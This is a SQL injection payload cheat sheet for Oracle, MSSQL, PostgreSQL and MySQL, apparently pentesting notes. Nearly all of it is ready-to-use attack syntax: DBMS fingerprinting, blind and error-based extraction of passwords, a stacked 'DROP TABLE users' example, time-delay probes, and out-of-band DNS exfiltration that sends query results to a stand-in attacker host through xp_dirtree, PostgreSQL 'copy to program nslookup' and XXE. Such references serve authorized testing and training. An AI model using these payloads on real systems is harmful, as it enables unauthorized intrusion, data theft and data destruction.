SQL Injection - DBMS Syntax Reference

The right SQLi payload depends on the backend database. First fingerprint the
DBMS, then look up the exact syntax for Oracle, Microsoft SQL Server,
PostgreSQL, or MySQL. This is the "which syntax do I use" companion to the main
sqli cheatsheet (find/confirm the injection, then come here for the dialect).
Replace <placeholders> and COLLAB (your Burp Collaborator / OOB domain) with
your own values.


Step 0 - Fingerprint the DBMS

Inject a string-concatenation probe - only the matching database returns
"foobar" without a syntax error:

    'foo'||'bar'      -> Oracle / PostgreSQL
    'foo'+'bar'       -> Microsoft SQL Server
    'foo' 'bar'       -> MySQL (space between the strings)

Other tells: Oracle needs FROM dual on constant selects and has no
information_schema; MySQL comments need "-- " (trailing space); only MSSQL/PG
reliably allow stacked queries.


===========================  A. BUILDING BLOCKS  ===========================

1. String concatenation

    Oracle       'foo'||'bar'
    Microsoft    'foo'+'bar'
    PostgreSQL   'foo'||'bar'
    MySQL        'foo' 'bar'        (space)   |   CONCAT('foo','bar')


2. Substring  (1-indexed; all return "ba" from "foobar")

    Oracle       SUBSTR('foobar', 4, 2)
    Microsoft    SUBSTRING('foobar', 4, 2)
    PostgreSQL   SUBSTRING('foobar', 4, 2)
    MySQL        SUBSTRING('foobar', 4, 2)


3. Comments

    Oracle       --comment
    Microsoft    --comment    |   /*comment*/
    PostgreSQL   --comment    |   /*comment*/
    MySQL        #comment     |   -- comment  (needs trailing space)  |  /*comment*/

    In URLs use  -- -  so the required trailing space survives.


4. Database version

    Oracle       SELECT banner FROM v$version
                 SELECT version FROM v$instance
    Microsoft    SELECT @@version
    PostgreSQL   SELECT version()
    MySQL        SELECT @@version


5. Database contents - list tables & columns

    Oracle       SELECT * FROM all_tables
                 SELECT * FROM all_tab_columns WHERE table_name = '<TABLE>'
    Microsoft    SELECT * FROM information_schema.tables
                 SELECT * FROM information_schema.columns WHERE table_name = '<TABLE>'
    PostgreSQL   SELECT * FROM information_schema.tables
                 SELECT * FROM information_schema.columns WHERE table_name = '<TABLE>'
    MySQL        SELECT * FROM information_schema.tables
                 SELECT * FROM information_schema.columns WHERE table_name = '<TABLE>'

    Oracle has no information_schema - use the all_* / user_* dictionary views.


======================  B. BLIND - CONDITIONAL RESPONSES  ==================

6. Conditional errors  (force an error only when the condition is true)

    Oracle       SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual
    Microsoft    SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END
    PostgreSQL   1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)
    MySQL        SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')

    Swap 1=1 for your real test, e.g. SUBSTR((SELECT ...),1,1)='a'.


7. Error-based extraction  (secret shows up inside a visible DB error)

    Microsoft    SELECT 'foo' WHERE 1 = (SELECT 'secret')
                 -> Conversion failed when converting the varchar value 'secret' to data type int.
    PostgreSQL   SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
                 -> invalid input syntax for type integer: "secret"
    MySQL        SELECT extractvalue(1,concat(0x7e,(SELECT @@version)))
                 updatexml(1,concat(0x7e,(SELECT database())),1)
    Oracle       SELECT to_char((SELECT user FROM dual)) FROM dual

    Error text truncates (~32 chars for MySQL extractvalue) - pull long values
    in chunks with SUBSTR. 0x7e is a "~" marker to spot your payload.


==================  C. STACKED QUERIES & TIME DELAYS  ======================

8. Batched / stacked queries

    Oracle       (not supported)
    Microsoft    QUERY-1 ; QUERY-2        e.g.  1; DROP TABLE users--
    PostgreSQL   QUERY-1 ; QUERY-2
    MySQL        QUERY-1 ; QUERY-2        (rarely usable - most drivers send one statement)


9. Time delays  (unconditional - proves your code executed)

    Oracle       dbms_pipe.receive_message(('a'),10)
    Microsoft    WAITFOR DELAY '0:0:10'
    PostgreSQL   SELECT pg_sleep(10)
    MySQL        SELECT SLEEP(10)


10. Conditional time delays  (blind extraction via response time)

    Oracle       SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
    Microsoft    IF (1=1) WAITFOR DELAY '0:0:10'
    PostgreSQL   SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
    MySQL        SELECT IF(1=1,SLEEP(10),0)


========================  D. OUT-OF-BAND (OOB / DNS)  ======================

11. DNS lookup  (trigger an interaction to your Collaborator)

    Oracle       SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual
                 legacy:  SELECT UTL_INADDR.get_host_address('COLLAB')
    Microsoft    exec master..xp_dirtree '//COLLAB/a'
    PostgreSQL   copy (SELECT '') to program 'nslookup COLLAB'
    MySQL        LOAD_FILE('\\\\COLLAB\\a')   |   SELECT ... INTO OUTFILE '\\\\COLLAB\\a'   (Windows only)


12. DNS lookup with data exfiltration  (result rides in the subdomain)

    Oracle       SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT <QUERY>)||'.COLLAB/"> %remote;]>'),'/l') FROM dual
    Microsoft    declare @p varchar(1024);set @p=(SELECT <QUERY>);exec('master..xp_dirtree "//'+@p+'.COLLAB/a"')
    PostgreSQL   create OR replace function f() returns void as $$ declare c text; begin SELECT into c (SELECT <QUERY>); execute 'copy (SELECT '''') to program ''nslookup '||c||'.COLLAB'''; end; $$ language plpgsql security definer; SELECT f();
    MySQL        SELECT <QUERY> INTO OUTFILE '\\\\'||(<QUERY>)||'.COLLAB\\a'   (Windows only)

    <QUERY> = a scalar SELECT, e.g. SELECT password FROM users LIMIT 1.
    DNS labels max 63 chars and drop dots/specials - hex/base-encode long or
    binary values and split across labels.


Key idea: SQLi payloads are dialect-specific - the same goal (read the version,
dump a table, delay the response, phone home over DNS) needs different syntax on
Oracle vs MSSQL vs PostgreSQL vs MySQL. Fingerprint first (string-concatenation
behaviour is the fastest tell), then grab the matching row. Pick your channel by
what the app leaks back: data on the page -> UNION / error-based; only
true/false or timing -> blind; nothing at all -> out-of-band DNS. sqlmap
--dbms and --technique automate all of this once you know the target.
